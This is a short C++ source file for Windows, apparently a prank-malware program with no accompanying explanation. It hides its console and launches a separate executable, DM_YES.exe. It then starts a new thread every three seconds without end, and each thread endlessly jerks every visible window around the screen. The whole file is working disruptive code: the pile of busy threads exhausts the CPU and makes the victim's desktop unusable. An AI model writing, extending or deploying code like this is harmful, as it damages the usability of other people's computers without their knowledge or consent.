#include <iostream>
#include <Windows.h>
#include<cmath>
#include<tchar.h>
#include<stdio.h>
#pragma comment(lib, "winmm.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 
#define winapi WINAPI
#define lpvoid LPVOID
#define dword DWORD
#define ulonglong ULONGLONG
#define uint UINT
#define rdtsc __rdtsc

int x = 1920, y = 1080;
HDC hdc = GetDC(0);
DWORD WINAPI  StartShake(LPVOID lpParam) {
	WinExec("DM_YES.exe", SW_SHOWMAXIMIZED);
	int sysX, sysY;
	sysX = GetSystemMetrics(SM_CXSCREEN);//get screen width
	sysY = GetSystemMetrics(SM_CYSCREEN);//get screen height
	while (1)
	{
		HWND hWnd = GetDesktopWindow();//get desktop handle
		for (hWnd = GetWindow(hWnd, GW_CHILD); hWnd; hWnd = GetWindow(hWnd, GW_HWNDNEXT))
		{
			RECT rect;

			long style = GetWindowLong(hWnd, GWL_STYLE);//get window type
			if (style & WS_VISIBLE)//window visible
			{
				GetWindowRect(hWnd, &rect);//Get window rectangle coordinates
				int posX, posY, cX, cY;
				bool flag = !(rand() % 2);

				cX = rect.right - rect.left;
				cY = rect.bottom - rect.top;

				//Generate new window coordinates
				if (flag)
				{
					posX = rect.left + rand() % 20 * 5;
					posY = rect.top + rand() % 10 * 5;
				}
				else
				{
					posX = rect.left - rand() % 20 * 5;
					posY = rect.top - rand() % 10 * 5;
				}

				//border judgment
				if (posX < 0)	posX = 0;
				if (posY < 0)	posY = 0;
				if (posX + cX > sysX)
					posX = sysX - cX;
				if (posY + cY > sysY)
					posY = sysY - cY;
				//set window position
				SetWindowPos(hWnd, HWND_NOTOPMOST, posX, posY, rect.right - rect.left,rect.bottom - rect.top, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOACTIVATE);
			}
		}

	}
}
int main()
{
	
	while (0==0) {
					HANDLE thread8 = CreateThread(0, 0, StartShake, 0, 0, 0);
		Sleep(3000);
	}
}
